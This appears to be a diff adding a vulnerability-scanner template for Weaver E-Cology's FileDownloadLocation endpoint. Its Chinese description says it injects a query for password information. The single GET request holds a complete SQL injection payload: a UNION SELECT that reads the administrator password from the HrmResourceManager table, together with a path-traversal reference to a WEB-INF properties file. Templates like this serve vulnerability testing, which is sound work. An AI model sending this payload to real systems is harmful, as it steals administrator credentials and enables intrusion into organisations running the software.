@@ -1,0 +1,12 @@
+name: 泛微E-Cology-FileDownloadLocation-SQL注入
+description: >
+  注入查询密码信息
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation?ddcode=7ea7ef3c41d67297&downfiletype=eml&download=1&mailId=1123+union+select+*+from+(select+1+as+resourceid,%27../ecology/WEB-INF/prop/mobilemode.properties%27+as+x2,%273%27+as+x3,(select++*+from+(select+*+from+(select+password+from+HrmResourceManager+where+id=1)x)x)+as+x4,5+as+x5,6+as+x6)x+where+1=1&mailid=action.WorkflowFnaEffectNew&parentid=0
+    expression:
+      status: 200
+      headers:
+        Content-Type: application/octet-stream
